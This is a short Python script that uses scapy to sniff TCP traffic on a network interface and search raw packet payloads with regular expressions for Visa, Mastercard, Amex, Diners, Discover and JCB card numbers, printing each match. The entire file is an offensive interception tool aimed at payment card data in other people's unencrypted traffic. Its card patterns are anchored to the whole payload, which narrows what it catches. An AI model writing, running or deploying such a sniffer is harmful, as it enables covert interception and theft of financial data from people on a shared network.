#!/usr/bin/env python
'''
Using scapy and regular expressions
to pull credit card numbers
from unencrypted http traffic
[Usage] python cc_scrape.py
'''
import re
from scapy.all import *
import argparse


cc_dict = { 
    'Visa': '^4[0-9]{12}(?:[0-9]{3})?$',
    'Master Card': '^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$',
    'American Express':  '^3[47][0-9]{13}$',
    'Diners Club': '^3(?:0[0-5]|[68][0-9])[0-9]{11}$',
    'Discover': '^6(?:011|5[0-9]{2})[0-9]{12}$',
    'JCB': '^(?:2131|1800|35\d{3})\d{11}$'
}

def findCreditCard(pkt):
    raw = pkt.sprintf('%Raw.load%')
    for ptn in cc_dict:
        cc = re.findall(cc_dict[ptn], raw)
        if cc:
            print('[+] Found {} Card: {}'.format(ptn, cc[0]))
            break

def main():
    parser = argparse.ArgumentParser('regex to scrape credit card strings from http')
    parser.add_argument('-i', dest='iface', type=str, default='mon0', help='specify network interface')
    args = parser.parse_args()
    iface = args.iface
    try:
        print('[*] Starting Credit Card Sniffer.')
        conf.iface=iface
        sniff(filter='tcp', prn=findCreditCard, store=0)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()
